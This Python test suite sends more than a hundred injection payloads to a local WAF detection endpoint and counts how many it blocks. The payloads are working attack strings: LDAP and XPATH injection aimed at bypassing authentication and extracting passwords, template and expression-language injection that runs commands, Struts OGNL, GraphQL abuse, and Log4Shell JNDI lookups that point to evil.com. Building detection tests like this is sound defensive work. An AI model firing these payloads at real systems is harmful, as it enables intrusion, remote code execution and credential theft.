#!/usr/bin/env python3
"""
LDAP & XPATH Injection Attack Test Suite
Tests LDAP, XPATH, and other injection techniques against the WAF
"""

import requests
import json
import time
import os
from typing import Dict

WAF_API = os.getenv("API_SERVER_URL", "http://localhost:3001") + "/api/waf/check"

# LDAP & XPATH Injection Payloads
INJECTION_ATTACKS = [
    # LDAP Injection - Authentication Bypass
    {
        "name": "LDAP auth bypass *",
        "path": "/api/ldap/auth",
        "body": {"username": "*", "password": "*"},
    },
    {
        "name": "LDAP auth bypass )(",
        "path": "/api/ldap/login",
        "body": {"user": "admin)(&)", "pass": "any"},
    },
    {
        "name": "LDAP OR injection",
        "path": "/api/ldap/search",
        "query": {"filter": "admin)(|(password=*)"},
    },
    {
        "name": "LDAP wildcard user",
        "path": "/api/ldap/find",
        "query": {"uid": "*)(uid=*))(|(uid=*"},
    },
    {
        "name": "LDAP null injection",
        "path": "/api/ldap/bind",
        "body": {"dn": "cn=admin\x00,dc=evil"},
    },
    # LDAP Injection - Data Extraction
    {
        "name": "LDAP extract all",
        "path": "/api/ldap/query",
        "query": {"search": "*))(|(objectclass=*)"},
    },
    {
        "name": "LDAP extract users",
        "path": "/api/ldap/users",
        "query": {"filter": "*)(objectClass=user)(|(sAMAccountName=*"},
    },
    {
        "name": "LDAP extract groups",
        "path": "/api/ldap/groups",
        "query": {"name": "*)(objectClass=group)(|(cn=*"},
    },
    {
        "name": "LDAP attribute enum",
        "path": "/api/ldap/attrs",
        "query": {"attr": "*)(|(userPassword=*)"},
    },
    # LDAP Injection - Boolean Blind
    {
        "name": "LDAP blind true",
        "path": "/api/ldap/check",
        "query": {"id": "admin)(|(password=a*)"},
    },
    {
        "name": "LDAP blind false",
        "path": "/api/ldap/verify",
        "query": {"id": "admin)(|(password=zzzzz*)"},
    },
    {
        "name": "LDAP blind char enum",
        "path": "/api/ldap/test",
        "body": {"user": "admin)(|(password=a*)", "test": True},
    },
    # LDAP Special Characters
    {
        "name": "LDAP parenthesis inject",
        "path": "/api/ldap/escape",
        "query": {"name": "admin))(|(uid=*"},
    },
    {
        "name": "LDAP asterisk inject",
        "path": "/api/ldap/match",
        "query": {"pattern": "*admin*)(|(cn=*"},
    },
    {
        "name": "LDAP backslash inject",
        "path": "/api/ldap/filter",
        "query": {"cn": "test\\)(|(objectClass=*"},
    },
    # XPATH Injection - Authentication Bypass
    {
        "name": "XPATH auth bypass 1",
        "path": "/api/xml/login",
        "body": {"user": "' or '1'='1", "pass": "' or '1'='1"},
    },
    {
        "name": "XPATH auth bypass 2",
        "path": "/api/xml/auth",
        "body": {"username": "admin' or '1'='1' or '1'='1", "password": "x"},
    },
    {
        "name": "XPATH comment bypass",
        "path": "/api/xml/signin",
        "body": {"user": "admin'--", "pass": "anything"},
    },
    {
        "name": "XPATH OR always true",
        "path": "/api/xml/verify",
        "query": {"id": "1 or 1=1"},
    },
    # XPATH Injection - Data Extraction
    {
        "name": "XPATH extract all nodes",
        "path": "/api/xml/query",
        "query": {"xpath": "//user[name/text()='' or 1=1 or ''='']"},
    },
    {
        "name": "XPATH extract passwords",
        "path": "/api/xml/search",
        "query": {"path": "//user/password/text()"},
    },
    {
        "name": "XPATH union attack",
        "path": "/api/xml/find",
        "query": {"expr": "1] | //password | user[id=1"},
    },
    {
        "name": "XPATH parent traverse",
        "path": "/api/xml/node",
        "query": {"select": "../password"},
    },
    {
        "name": "XPATH self axis",
        "path": "/api/xml/get",
        "query": {"path": "self::node()/password"},
    },
    {
        "name": "XPATH ancestor axis",
        "path": "/api/xml/fetch",
        "query": {"xpath": "ancestor::*/password"},
    },
    # XPATH Injection - Boolean Blind
    {
        "name": "XPATH blind string-length",
        "path": "/api/xml/check",
        "query": {"test": "' or string-length(//password)>0 or ''='"},
    },
    {
        "name": "XPATH blind substring",
        "path": "/api/xml/validate",
        "query": {"data": "' or substring(//password,1,1)='a' or ''='"},
    },
    {
        "name": "XPATH blind contains",
        "path": "/api/xml/exists",
        "query": {"query": "' or contains(//password,'admin') or ''='"},
    },
    {
        "name": "XPATH blind starts-with",
        "path": "/api/xml/match",
        "query": {"filter": "' or starts-with(//password,'pass') or ''='"},
    },
    # XPATH 2.0 / XQuery Injection
    {
        "name": "XQuery doc function",
        "path": "/api/xquery",
        "body": {"query": "doc('file:///etc/passwd')"},
    },
    {
        "name": "XQuery collection",
        "path": "/api/xquery/exec",
        "body": {"expr": "collection()//password"},
    },
    {
        "name": "XQuery for loop",
        "path": "/api/xquery/run",
        "body": {"xq": "for $x in //user return $x/password"},
    },
    {
        "name": "XQuery let injection",
        "path": "/api/xquery/eval",
        "body": {"query": "let $x := //password return $x"},
    },
    # Template Injection (SSTI)
    {"name": "Jinja2 SSTI", "path": "/api/template", "body": {"name": "{{7*7}}"}},
    {
        "name": "Jinja2 config",
        "path": "/api/render",
        "body": {"template": "{{config}}"},
    },
    {
        "name": "Jinja2 RCE",
        "path": "/api/format",
        "body": {"text": "{{''.__class__.__mro__[2].__subclasses__()}}"},
    },
    {
        "name": "Twig SSTI",
        "path": "/api/twig",
        "body": {"input": "{{_self.env.registerUndefinedFilterCallback('exec')}}"},
    },
    {
        "name": "Freemarker SSTI",
        "path": "/api/ftl",
        "body": {
            "data": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
        },
    },
    {
        "name": "Velocity SSTI",
        "path": "/api/velocity",
        "body": {"vm": "#set($str=$class.inspect('java.lang.String').type)"},
    },
    {
        "name": "Pebble SSTI",
        "path": "/api/pebble",
        "body": {"tmpl": "{% set cmd = 'id' %}{{ cmd | raw }}"},
    },
    {
        "name": "Smarty SSTI",
        "path": "/api/smarty",
        "body": {"tpl": "{php}system('id');{/php}"},
    },
    {
        "name": "Thymeleaf SSTI",
        "path": "/api/thymeleaf",
        "body": {"expr": "__${T(java.lang.Runtime).getRuntime().exec('id')}__"},
    },
    # Expression Language Injection (EL)
    {
        "name": "Spring EL injection",
        "path": "/api/spring/el",
        "body": {"expr": "${T(java.lang.Runtime).getRuntime().exec('id')}"},
    },
    {
        "name": "JSP EL injection",
        "path": "/api/jsp",
        "query": {
            "name": "${pageContext.request.getSession().setAttribute('admin',true)}"
        },
    },
    {
        "name": "OGNL injection",
        "path": "/api/struts",
        "body": {"action": "%{(#rt=@java.lang.Runtime@getRuntime().exec('id'))}"},
    },
    {
        "name": "MVEL injection",
        "path": "/api/mvel",
        "body": {"expr": "Runtime.getRuntime().exec('id')"},
    },
    {
        "name": "SpEL injection",
        "path": "/api/spel",
        "body": {"expression": "#{T(java.lang.Runtime).getRuntime().exec('whoami')}"},
    },
    # GraphQL Injection
    {
        "name": "GraphQL introspection",
        "path": "/api/graphql",
        "body": {"query": "{__schema{types{name}}}"},
    },
    {
        "name": "GraphQL batching",
        "path": "/api/graphql",
        "body": [
            {"query": "{user(id:1){password}}"},
            {"query": "{user(id:2){password}}"},
        ],
    },
    {
        "name": "GraphQL alias DoS",
        "path": "/api/graphql",
        "body": {"query": "{a1:user(id:1){id} a2:user(id:1){id} a3:user(id:1){id}}"},
    },
    {
        "name": "GraphQL nested query",
        "path": "/api/graphql",
        "body": {"query": "{user{friends{friends{friends{friends{name}}}}}}"},
    },
    {
        "name": "GraphQL mutation",
        "path": "/api/graphql",
        "body": {"query": "mutation{deleteUser(id:1)}"},
    },
    # ORM Injection
    {
        "name": "Hibernate HQL",
        "path": "/api/hibernate",
        "query": {"hql": "from User where name='admin' or '1'='1'"},
    },
    {
        "name": "JPA JPQL",
        "path": "/api/jpa",
        "query": {"query": "SELECT u FROM User u WHERE u.name = 'admin' OR '1'='1'"},
    },
    {
        "name": "Django ORM",
        "path": "/api/django",
        "query": {"filter": "__class__.__mro__[2].__subclasses__()"},
    },
    {
        "name": "SQLAlchemy",
        "path": "/api/sqlalchemy",
        "body": {"filter": "User.name == 'admin' or True"},
    },
    {
        "name": "Mongoose injection",
        "path": "/api/mongoose",
        "body": {"$where": "this.password.length > 0"},
    },
    # --- Extended Jinja2 SSTI ---
    {
        "name": "Jinja2 lipsum RCE",
        "path": "/api/template",
        "body": {"name": "{{lipsum.__globals__.os.popen('id').read()}}"},
    },
    {
        "name": "Jinja2 cycler RCE",
        "path": "/api/render",
        "body": {"text": "{{cycler.__init__.__globals__.os.popen('id').read()}}"},
    },
    {
        "name": "Jinja2 joiner RCE",
        "path": "/api/format",
        "body": {"text": "{{joiner.__init__.__globals__.os.popen('id').read()}}"},
    },
    {
        "name": "Jinja2 namespace RCE",
        "path": "/api/template",
        "body": {"name": "{{namespace.__init__.__globals__.os.popen('id').read()}}"},
    },
    {
        "name": "Jinja2 request globals",
        "path": "/api/render",
        "body": {"text": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"},
    },
    {
        "name": "Jinja2 MRO base classes",
        "path": "/api/format",
        "body": {"text": "{{''.__class__.__bases__[0].__subclasses__()}}"},
    },
    {
        "name": "Jinja2 self TemplateRef",
        "path": "/api/template",
        "body": {"name": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"},
    },
    {
        "name": "Jinja2 import OS",
        "path": "/api/render",
        "body": {"text": "{% import os %}{{ os.popen('id').read() }}"},
    },
    {
        "name": "Jinja2 config init globals",
        "path": "/api/template",
        "body": {"text": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
    },
    {
        "name": "Jinja2 dict MRO",
        "path": "/api/format",
        "body": {"text": "{{{}.__class__.__bases__[0].__subclasses__()}}"},
    },
    # --- Extended Twig SSTI ---
    {
        "name": "Twig system exec",
        "path": "/api/twig",
        "body": {"input": "{{['id']|filter('system')}}"},
    },
    {
        "name": "Twig passthru",
        "path": "/api/twig",
        "body": {"input": "{{['id']|filter('passthru')}}"},
    },
    {
        "name": "Twig file_get",
        "path": "/api/twig",
        "body": {"input": "{{'/etc/passwd'|file_excerpt(1,30)}}"},
    },
    {
        "name": "Twig include file",
        "path": "/api/twig",
        "body": {"input": "{{include('/etc/passwd')}}"},
    },
    # --- Extended Freemarker SSTI ---
    {
        "name": "Freemarker Execute",
        "path": "/api/ftl",
        "body": {"data": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"},
    },
    {
        "name": "Freemarker ObjectConst",
        "path": "/api/ftl",
        "body": {"data": "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.Runtime\").exec(\"id\")}"},
    },
    {
        "name": "Freemarker assign RCE",
        "path": "/api/ftl",
        "body": {"data": "<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}"},
    },
    # --- Extended Velocity SSTI ---
    {
        "name": "Velocity Runtime exec",
        "path": "/api/velocity",
        "body": {"vm": "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")"},
    },
    {
        "name": "Velocity class inspect",
        "path": "/api/velocity",
        "body": {"vm": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex"},
    },
    # --- Extended Pebble SSTI ---
    {
        "name": "Pebble RCE",
        "path": "/api/pebble",
        "body": {"tmpl": "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}{{ bytes }}"},
    },
    # --- Extended Smarty SSTI ---
    {
        "name": "Smarty math eval",
        "path": "/api/smarty",
        "body": {"tpl": "{math equation=\"x\" x=\"system('id')\"}"},
    },
    {
        "name": "Smarty if eval",
        "path": "/api/smarty",
        "body": {"tpl": "{if system('id')}{/if}"},
    },
    # --- Extended Thymeleaf SSTI ---
    {
        "name": "Thymeleaf SpEL RCE",
        "path": "/api/thymeleaf",
        "body": {"expr": "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::x"},
    },
    {
        "name": "Thymeleaf URL inject",
        "path": "/api/thymeleaf",
        "body": {"url": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"},
    },
    # --- ERB (Ruby) SSTI ---
    {
        "name": "ERB system exec",
        "path": "/api/erb",
        "body": {"template": "<%= system('id') %>"},
    },
    {
        "name": "ERB exec backtick",
        "path": "/api/erb",
        "body": {"template": "<%= `id` %>"},
    },
    {
        "name": "ERB IO.popen",
        "path": "/api/erb",
        "body": {"template": "<%= IO.popen('id').readlines() %>"},
    },
    # --- Mako SSTI ---
    {
        "name": "Mako import RCE",
        "path": "/api/mako",
        "body": {"template": "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}"},
    },
    {
        "name": "Mako inline exec",
        "path": "/api/mako",
        "body": {"template": "${__import__('os').popen('id').read()}"},
    },
    # --- Handlebars SSTI ---
    {
        "name": "Handlebars lookup",
        "path": "/api/hbs",
        "body": {"template": "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').exec('id');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}"},
    },
    # --- EL (Expression Language) extended ---
    {
        "name": "EL Runtime class",
        "path": "/api/spring/el",
        "body": {"expr": "#{T(java.lang.Runtime).getRuntime().exec('id')}"},
    },
    {
        "name": "EL ProcessBuilder",
        "path": "/api/spring/el",
        "body": {"expr": "#{new java.lang.ProcessBuilder({'id'}).start()}"},
    },
    {
        "name": "EL ScriptEngine",
        "path": "/api/spring/el",
        "body": {"expr": "#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"id\")')}"},
    },
    {
        "name": "OGNL classloader",
        "path": "/api/struts",
        "body": {"action": "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}"},
    },
    {
        "name": "OGNL S2-045",
        "path": "/api/struts",
        "headers": {"Content-Type": "%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}"},
    },
    # --- Razor (ASP.NET) SSTI ---
    {
        "name": "Razor code block",
        "path": "/api/razor",
        "body": {"template": "@{ System.Diagnostics.Process.Start(\"cmd.exe\", \"/c id\"); }"},
    },
    {
        "name": "Razor inline expr",
        "path": "/api/razor",
        "body": {"template": "@(1+1)"},
    },
    # --- Jade/Pug SSTI ---
    {
        "name": "Pug code inject",
        "path": "/api/pug",
        "body": {"template": "- var x = root.process.mainModule.require('child_process').execSync('id').toString()"},
    },
    # --- Nunjucks SSTI ---
    {
        "name": "Nunjucks range RCE",
        "path": "/api/nunjucks",
        "body": {"template": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"},
    },
    # --- SSTI detection probes ---
    {
        "name": "SSTI probe {{7*7}}", "path": "/api/search",
        "query": {"q": "{{7*7}}"},
    },
    {
        "name": "SSTI probe ${7*7}", "path": "/api/search",
        "query": {"q": "${7*7}"},
    },
    {
        "name": "SSTI probe #{7*7}", "path": "/api/search",
        "query": {"q": "#{7*7}"},
    },
    {
        "name": "SSTI probe <%=7*7%>", "path": "/api/search",
        "query": {"q": "<%=7*7%>"},
    },
    {
        "name": "SSTI probe {7*7}", "path": "/api/search",
        "query": {"q": "{7*7}"},
    },
    {
        "name": "SSTI probe {{7*'7'}}", "path": "/api/search",
        "query": {"q": "{{7*'7'}}"},
    },
    # --- LDAP injection extended ---
    {
        "name": "LDAP admin close inject",
        "path": "/api/ldap/auth",
        "body": {"username": "admin)(&(objectClass=*))", "password": "x"},
    },
    {
        "name": "LDAP nested OR",
        "path": "/api/ldap/search",
        "query": {"filter": "admin)(|(uid=*)(cn=*)(sn=*))"},
    },
    {
        "name": "LDAP AND password",
        "path": "/api/ldap/auth",
        "body": {"username": "admin)(&(userPassword=*))", "password": "any"},
    },
    {
        "name": "LDAP objectclass enum",
        "path": "/api/ldap/query",
        "query": {"search": "*)(objectClass=person)(cn=*"},
    },
    {
        "name": "LDAP DN injection",
        "path": "/api/ldap/bind",
        "body": {"dn": "cn=admin,dc=evil,dc=com"},
    },
    {
        "name": "LDAP search scope",
        "path": "/api/ldap/search",
        "query": {"filter": "(|(uid=*)(objectClass=*))"},
    },
    {
        "name": "LDAP JNDI lookup",
        "path": "/api/search",
        "query": {"q": "${jndi:ldap://evil.com/exploit}"},
    },
    {
        "name": "LDAP JNDI RMI",
        "path": "/api/search",
        "query": {"q": "${jndi:rmi://evil.com/exploit}"},
    },
    {
        "name": "LDAP JNDI DNS",
        "path": "/api/search",
        "query": {"q": "${jndi:dns://evil.com}"},
    },
    {
        "name": "Log4Shell basic",
        "path": "/api/data",
        "headers": {"X-Api-Version": "${jndi:ldap://evil.com/a}"},
    },
    {
        "name": "Log4Shell UA",
        "path": "/api/data",
        "headers": {"User-Agent": "${jndi:ldap://evil.com/a}"},
    },
    {
        "name": "Log4Shell obfusc",
        "path": "/api/data",
        "headers": {"X-Custom": "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}"},
    },
    # --- XPATH extended ---
    {
        "name": "XPATH count users",
        "path": "/api/xml/query",
        "query": {"xpath": "count(//user)"},
    },
    {
        "name": "XPATH position extract",
        "path": "/api/xml/query",
        "query": {"xpath": "//user[position()=1]/password/text()"},
    },
    {
        "name": "XPATH normalize-space",
        "path": "/api/xml/query",
        "query": {"xpath": "//user[normalize-space(name)='admin']/password"},
    },
    {
        "name": "XPATH translate bypass",
        "path": "/api/xml/query",
        "query": {"xpath": "//user[translate(name,'ADMIN','admin')='admin']/password"},
    },
    {
        "name": "XPATH last() position",
        "path": "/api/xml/query",
        "query": {"xpath": "//user[last()]/password"},
    },
    # --- Hidden in legitimate requests ---
    {
        "name": "Search LDAP inject",
        "path": "/api/directory/search",
        "query": {"q": "John*)(|(department=*))", "type": "employee"},
    },
    {
        "name": "Config XPATH inject",
        "path": "/api/settings",
        "body": {"config_path": "../../../password", "format": "xml"},
    },
    {
        "name": "Report template inject",
        "path": "/api/report/generate",
        "body": {"template": "{{request.application.__globals__}}", "format": "pdf"},
    },
    {
        "name": "Comment SSTI inject",
        "path": "/api/comments",
        "body": {"text": "Check out {{config.items()}} for more info", "user": "guest"},
    },
    {
        "name": "Feedback EL inject",
        "path": "/api/feedback",
        "body": {"message": "${T(java.lang.Runtime).getRuntime().exec('id')}", "rating": 5},
    },
]


def test_payload(attack: Dict) -> Dict:
    """Test a single injection payload against WAF"""
    payload = {
        "method": "POST" if "body" in attack else "GET",
        "path": attack["path"],
        "query_params": attack.get("query", {}),
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
    }

    body = attack.get("body")
    if body:
        payload["body"] = json.dumps(body) if isinstance(body, (dict, list)) else body

    try:
        response = requests.post(WAF_API, json=payload, timeout=10)
        result = response.json()
        return {
            "name": attack["name"],
            "detected": result.get("is_anomaly", False),
            "score": result.get("anomaly_score", 0),
            "time_ms": result.get("processing_time_ms", 0),
        }
    except Exception as e:
        return {"name": attack["name"], "error": str(e)}


def main():
    print("=" * 70)
    print("LDAP, XPATH & TEMPLATE INJECTION ATTACK TEST SUITE")
    print("=" * 70)
    print(f"Testing {len(INJECTION_ATTACKS)} injection payloads...\n")

    detected = 0
    missed = 0
    errors = 0

    for i, attack in enumerate(INJECTION_ATTACKS, 1):
        result = test_payload(attack)

        if "error" in result:
            status = "\033[93m[ERROR]\033[0m"
            errors += 1
        elif result["detected"]:
            status = "\033[92m[BLOCKED]\033[0m"
            detected += 1
        else:
            status = "\033[91m[MISSED]\033[0m"
            missed += 1

        score = result.get("score", 0)
        print(
            f"[{i:02d}/{len(INJECTION_ATTACKS)}] {status} {result['name'][:40]:<40} Score: {score:.4f}"
        )
        time.sleep(0.05)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Total Tests:  {len(INJECTION_ATTACKS)}")
    print(f"\033[92mBlocked:      {detected}\033[0m")
    print(f"\033[91mMissed:       {missed}\033[0m")
    print(f"\033[93mErrors:       {errors}\033[0m")
    detection_rate = (
        detected / (len(INJECTION_ATTACKS) - errors) * 100
        if (len(INJECTION_ATTACKS) - errors) > 0
        else 0
    )
    print(f"Detection Rate: {detection_rate:.1f}%")
    print("=" * 70)


if __name__ == "__main__":
    main()
